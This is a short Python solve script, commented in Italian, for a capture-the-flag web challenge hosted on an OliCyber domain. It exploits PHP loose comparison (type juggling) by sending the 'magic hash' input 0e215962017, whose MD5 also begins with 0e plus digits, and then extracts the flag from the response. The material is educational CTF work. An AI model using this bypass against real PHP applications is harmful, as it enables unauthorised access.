# Puoi provare a confondermi, ma, mi dispiace, non sei il tipo giusto per me.
# Sito: http://confuse-me.challs.olicyber.it

import requests
import re

# Hint 1: La vulnerabilità sta nel fatto che manca 1 carattere nel file index.php. Chissà quale però :)
# Hint 2: Forse due uguali non bastano in PHP...

url = "http://confuse-me.challs.olicyber.it/"

# la condizione da soddisfare è che l'input sia uguale ai primi 24 caratteri della sua hash md5
# possiamo sfruttare la notazione scientifica per creare un numero che in PHP venga interpretato come 0e+...
# questi valori, quando convertiti in float, diventano 0.0, e quindi PHP li considera uguali tra loro

# la loose comparison è problematica perchè PHP fa type juggling e confronta i valori in modo non sicuro
# se io metto una qualsiasi stringa che inizia con "0e" seguita solo da cifre, PHP la interpreta come 0 in notazione scientifica
# e quindi rendo il confronto 0 == 0, che è vero

# md5("0e215962017") = 0e291242476940776845150308577824 -> 0e + cifre
risultato = requests.get(f"{url}/?input=0e215962017").text

match = re.search(r'flag\{[^\}]+\}', risultato)
flag = match.group(0)
print(f"\nFlag: {flag}")